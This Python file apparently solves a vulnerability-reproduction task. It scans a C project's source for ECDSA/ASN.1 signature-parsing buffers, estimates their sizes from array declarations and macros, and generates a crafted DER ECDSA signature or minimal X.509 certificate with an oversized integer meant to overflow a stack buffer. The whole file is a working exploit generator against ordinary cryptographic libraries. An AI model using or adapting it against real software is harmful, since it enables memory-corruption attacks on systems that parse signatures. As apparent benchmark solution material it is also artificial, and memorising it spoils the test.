import os
import re
import tarfile
import ast
from typing import Dict, Iterable, List, Optional, Tuple


class _SafeExprEval(ast.NodeVisitor):
    __slots__ = ("names",)

    def __init__(self, names: Dict[str, int]):
        self.names = names

    def visit_Expression(self, node):
        return self.visit(node.body)

    def visit_Constant(self, node):
        if isinstance(node.value, (int,)):
            return int(node.value)
        raise ValueError("non-int constant")

    def visit_Num(self, node):
        return int(node.n)

    def visit_Name(self, node):
        if node.id in self.names:
            return int(self.names[node.id])
        raise ValueError(f"unknown name {node.id}")

    def visit_UnaryOp(self, node):
        v = self.visit(node.operand)
        if isinstance(node.op, ast.UAdd):
            return +v
        if isinstance(node.op, ast.USub):
            return -v
        if isinstance(node.op, ast.Invert):
            return ~v
        raise ValueError("bad unary")

    def visit_BinOp(self, node):
        a = self.visit(node.left)
        b = self.visit(node.right)
        op = node.op
        if isinstance(op, ast.Add):
            return a + b
        if isinstance(op, ast.Sub):
            return a - b
        if isinstance(op, ast.Mult):
            return a * b
        if isinstance(op, (ast.Div, ast.FloorDiv)):
            if b == 0:
                raise ValueError("div0")
            return a // b
        if isinstance(op, ast.Mod):
            if b == 0:
                raise ValueError("mod0")
            return a % b
        if isinstance(op, ast.LShift):
            return a << b
        if isinstance(op, ast.RShift):
            return a >> b
        if isinstance(op, ast.BitOr):
            return a | b
        if isinstance(op, ast.BitAnd):
            return a & b
        if isinstance(op, ast.BitXor):
            return a ^ b
        raise ValueError("bad binop")

    def visit_Call(self, node):
        raise ValueError("call not allowed")

    def visit_Attribute(self, node):
        raise ValueError("attr not allowed")

    def generic_visit(self, node):
        raise ValueError(f"bad node {type(node).__name__}")


def _iter_source_files(src_path: str) -> Iterable[Tuple[str, bytes]]:
    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                p = os.path.join(root, fn)
                try:
                    st = os.stat(p)
                except OSError:
                    continue
                if st.st_size <= 0 or st.st_size > 8 * 1024 * 1024:
                    continue
                try:
                    with open(p, "rb") as f:
                        yield p, f.read()
                except OSError:
                    continue
        return

    try:
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                if m.size <= 0 or m.size > 8 * 1024 * 1024:
                    continue
                name = m.name
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read()
                except Exception:
                    continue
                yield name, data
    except Exception:
        # Fallback: treat as raw file
        try:
            with open(src_path, "rb") as f:
                yield src_path, f.read()
        except OSError:
            return


def _decode_text(b: bytes) -> str:
    return b.decode("latin-1", "ignore")


_DEFINE_RE = re.compile(r"^[ \t]*#[ \t]*define[ \t]+([A-Za-z_]\w*)[ \t]+(.+?)\s*(?:/\*.*)?$", re.M)
_CINT_SUFFIX_RE = re.compile(r"(?<=\b)(0x[0-9A-Fa-f]+|\d+)(?:[uUlL]+)\b")
_ARRAY_DECL_RE = re.compile(
    r"\b(?:unsigned\s+char|char|uint8_t|int8_t|byte|u8|unsigned\s+int|uint16_t|uint32_t|size_t)\s+([A-Za-z_]\w*)\s*\[\s*([^\]\r\n;]+)\s*\]"
)
_MEMCPY_RE = re.compile(r"\b(?:memcpy|memmove|bcopy|psMemcpy)\s*\(\s*([A-Za-z_]\w*)\s*,\s*[^,]*,\s*([^)]+?)\s*\)")
_LEN_HINT_RE = re.compile(r"\b(len|Len|length|size|sz|nbytes|rLen|sLen)\b")
_ASN_HINT_RE = re.compile(r"\b(ASN1|asn1|ECDSA|ecdsa|SIG|sig|signature|X509|x509|CERT|cert)\b")


def _strip_c_comments(s: str) -> str:
    s = re.sub(r"/\*.*?\*/", " ", s, flags=re.S)
    s = re.sub(r"//.*?$", " ", s, flags=re.M)
    return s


def _clean_define_value(v: str) -> str:
    v = v.strip()
    v = _strip_c_comments(v).strip()
    if v.endswith("\\"):
        v = v[:-1].strip()
    # Remove surrounding parentheses
    while v.startswith("(") and v.endswith(")"):
        inner = v[1:-1].strip()
        # avoid stripping something like (a) + (b)
        if inner.count("(") == inner.count(")"):
            v = inner
        else:
            break
    v = _CINT_SUFFIX_RE.sub(r"\1", v)
    # Remove casts like (uint32_t)
    v = re.sub(r"\([ \t]*[A-Za-z_]\w*(?:[ \t]*\*+)?[ \t]*\)", " ", v)
    v = v.strip()
    return v


def _try_eval_int(expr: str, names: Dict[str, int]) -> Optional[int]:
    expr = expr.strip()
    if not expr:
        return None
    if "sizeof" in expr or "{" in expr or "}" in expr or "?" in expr or ":" in expr:
        return None
    if len(expr) > 120:
        return None
    expr = _clean_define_value(expr)
    if not expr:
        return None
    try:
        tree = ast.parse(expr, mode="eval")
        val = _SafeExprEval(names).visit(tree)
        if not isinstance(val, int):
            return None
        if abs(val) > 1_000_000_000:
            return None
        return int(val)
    except Exception:
        return None


def _build_macro_map(texts: List[str]) -> Dict[str, int]:
    exprs: Dict[str, str] = {}
    vals: Dict[str, int] = {}
    for t in texts:
        for m in _DEFINE_RE.finditer(t):
            name = m.group(1)
            v = m.group(2).strip()
            if not v:
                continue
            if name in exprs or name in vals:
                continue
            v = _clean_define_value(v)
            if not v or v == name:
                continue
            if re.fullmatch(r"(?:0x[0-9A-Fa-f]+|\d+)", v):
                try:
                    vals[name] = int(v, 0)
                except Exception:
                    pass
            else:
                if len(v) <= 160:
                    exprs[name] = v

    for _ in range(30):
        progressed = False
        if not exprs:
            break
        to_del = []
        for k, e in exprs.items():
            v = _try_eval_int(e, vals)
            if v is None:
                continue
            vals[k] = v
            to_del.append(k)
            progressed = True
        for k in to_del:
            exprs.pop(k, None)
        if not progressed:
            break
    return vals


def _guess_attack_len(texts: List[str], macro_map: Dict[str, int]) -> int:
    decl_sizes: Dict[str, int] = {}
    # collect array decls
    for t in texts:
        for m in _ARRAY_DECL_RE.finditer(t):
            name = m.group(1)
            sz_expr = m.group(2).strip()
            if not sz_expr:
                continue
            sz_val = None
            if re.fullmatch(r"\d{1,6}", sz_expr):
                sz_val = int(sz_expr, 10)
            elif re.fullmatch(r"0x[0-9A-Fa-f]{1,6}", sz_expr):
                sz_val = int(sz_expr, 16)
            else:
                sz_val = _try_eval_int(sz_expr, macro_map)
            if sz_val is None:
                continue
            if 1 <= sz_val <= 200000:
                # keep the largest for a given name
                prev = decl_sizes.get(name)
                if prev is None or sz_val > prev:
                    decl_sizes[name] = sz_val

    # collect memcpy destinations with variable-ish lengths
    candidates: List[int] = []
    for t in texts:
        if not _ASN_HINT_RE.search(t):
            continue
        for mm in _MEMCPY_RE.finditer(t):
            dest = mm.group(1)
            lenexpr = mm.group(2)
            if not _LEN_HINT_RE.search(lenexpr):
                continue
            sz = decl_sizes.get(dest)
            if sz is not None:
                candidates.append(sz)

    # also look for typical r/s buffers in ECDSA ASN.1 parsing (even if no memcpy matched)
    for t in texts:
        lt = t.lower()
        if "ecdsa" not in lt or "asn1" not in lt:
            continue
        for name in ("r", "s", "sig", "signature", "rs", "der", "tmp", "buf"):
            if name in decl_sizes:
                candidates.append(decl_sizes[name])

    best = 0
    if candidates:
        best = max(candidates)

    # choose length slightly above the inferred buffer size; ensure long-form length
    if best >= 64:
        attack_len = best + 1
        if attack_len < 256:
            attack_len = 256
        if attack_len > 60000:
            attack_len = 60000
        return attack_len

    # fallback: large enough to overflow almost any stack buffer but keep <= 65535
    return 45000


def _der_len(n: int) -> bytes:
    if n < 0:
        raise ValueError("negative length")
    if n < 128:
        return bytes([n])
    b = n.to_bytes((n.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(b)]) + b


def _der_tlv(tag: int, val: bytes) -> bytes:
    return bytes([tag]) + _der_len(len(val)) + val


def _der_seq(parts: List[bytes]) -> bytes:
    return _der_tlv(0x30, b"".join(parts))


def _der_set(parts: List[bytes]) -> bytes:
    return _der_tlv(0x31, b"".join(parts))


def _der_int_raw(bv: bytes) -> bytes:
    if not bv:
        bv = b"\x00"
    # ensure positive if high bit set
    if bv[0] & 0x80:
        bv = b"\x00" + bv
    return _der_tlv(0x02, bv)


def _der_oid(oid: str) -> bytes:
    parts = [int(x) for x in oid.strip().split(".") if x != ""]
    if len(parts) < 2:
        raise ValueError("bad oid")
    first = 40 * parts[0] + parts[1]
    out = bytearray([first])

    for v in parts[2:]:
        if v < 0:
            raise ValueError("bad oid part")
        enc = []
        if v == 0:
            enc = [0]
        else:
            while v:
                enc.append(v & 0x7F)
                v >>= 7
            enc.reverse()
        for i, x in enumerate(enc):
            if i != len(enc) - 1:
                out.append(0x80 | x)
            else:
                out.append(x)
    return _der_tlv(0x06, bytes(out))


def _der_printable(s: str) -> bytes:
    return _der_tlv(0x13, s.encode("ascii", "ignore")[:255] or b"a")


def _der_utf8(s: str) -> bytes:
    b = s.encode("utf-8")[:255] or b"a"
    return _der_tlv(0x0C, b)


def _der_utctime(s: str) -> bytes:
    # expects YYMMDDhhmmssZ
    b = s.encode("ascii")
    return _der_tlv(0x17, b)


def _der_bitstr(payload: bytes, unused_bits: int = 0) -> bytes:
    if not (0 <= unused_bits <= 7):
        unused_bits = 0
    return _der_tlv(0x03, bytes([unused_bits]) + payload)


def _build_ecdsa_sig_der(r_len: int, s_len: int = 1) -> bytes:
    if r_len < 1:
        r_len = 1
    if s_len < 1:
        s_len = 1
    r_bytes = b"\x01" * r_len
    s_bytes = b"\x01" * s_len
    r = _der_tlv(0x02, r_bytes)
    s = _der_tlv(0x02, s_bytes)
    return _der_seq([r, s])


def _build_min_x509_with_sig(sig_der: bytes) -> bytes:
    # Name: CN=a
    atv = _der_seq([_der_oid("2.5.4.3"), _der_printable("a")])
    rdn = _der_set([atv])
    name = _der_seq([rdn])

    # Validity
    validity = _der_seq([_der_utctime("240101000000Z"), _der_utctime("250101000000Z")])

    # SubjectPublicKeyInfo for prime256v1 with base point (valid EC point)
    alg = _der_seq([_der_oid("1.2.840.10045.2.1"), _der_oid("1.2.840.10045.3.1.7")])
    gx = bytes.fromhex("6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296")
    gy = bytes.fromhex("4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5")
    pubkey = b"\x04" + gx + gy
    spki = _der_seq([alg, _der_bitstr(pubkey, 0)])

    # AlgorithmIdentifier: ecdsa-with-SHA256
    sig_alg = _der_seq([_der_oid("1.2.840.10045.4.3.2")])

    # TBSCertificate (v1, no extensions)
    serial = _der_int_raw(b"\x01")
    tbs = _der_seq([serial, sig_alg, name, validity, name, spki])

    # Certificate
    signature_value = _der_bitstr(sig_der, 0)
    cert = _der_seq([tbs, sig_alg, signature_value])
    return cert


def _detect_input_mode(file_infos: List[Tuple[str, str]]) -> str:
    # returns 'sig' or 'cert'
    harness_texts = []
    for path, text in file_infos:
        pl = path.lower()
        if any(k in pl for k in ("fuzz", "fuzzer", "ossfuzz", "honggfuzz", "afl", "poc", "harness", "testoneinput")):
            harness_texts.append(text)
        elif "LLVMFuzzerTestOneInput" in text or "AFL_FUZZ" in text or "HF_ITER" in text:
            harness_texts.append(text)
    if not harness_texts:
        # fallback heuristic: if project seems heavily X.509 focused
        combined = "\n".join(text for _, text in file_infos[:30])
        if re.search(r"\b(d2i_X509|x509_crt_parse|mbedtls_x509_crt_parse|X509_parse|x509_parse)\b", combined):
            return "cert"
        return "sig"

    combined = "\n".join(harness_texts)
    if re.search(r"\b(d2i_X509|x509_crt_parse|mbedtls_x509_crt_parse|X509_parse|x509_parse|CERTIFICATE)\b", combined):
        return "cert"
    if re.search(r"\b(d2i_ECDSA_SIG|ECDSA_SIG|ecdsa_read_signature|DecodeECC_DSA_Sig|parse_ecdsa|ecdsa_sig)\b", combined):
        return "sig"
    # If harness explicitly mentions certificate verification, prefer cert
    if re.search(r"\b(x509|crt|certificate)\b", combined, flags=re.I):
        return "cert"
    return "sig"


class Solution:
    def solve(self, src_path: str) -> bytes:
        file_infos: List[Tuple[str, str]] = []
        texts_for_macros: List[str] = []
        texts_for_analysis: List[str] = []

        for path, data in _iter_source_files(src_path):
            pl = path.lower()
            if not (pl.endswith(".c") or pl.endswith(".h") or pl.endswith(".cc") or pl.endswith(".cpp") or pl.endswith(".hpp")):
                continue
            text = _decode_text(data)
            if not text:
                continue
            file_infos.append((path, text))
            texts_for_macros.append(text)

        macro_map = _build_macro_map(texts_for_macros)

        # Select only potentially relevant texts for faster scanning
        for _, text in file_infos:
            lt = text.lower()
            if ("ecdsa" in lt) or ("asn1" in lt) or ("x509" in lt) or ("signature" in lt):
                texts_for_analysis.append(text)

        if not texts_for_analysis:
            texts_for_analysis = texts_for_macros

        mode = _detect_input_mode(file_infos)
        attack_len = _guess_attack_len(texts_for_analysis, macro_map)

        sig_der = _build_ecdsa_sig_der(attack_len, 1)
        if mode == "cert":
            return _build_min_x509_with_sig(sig_der)
        return sig_der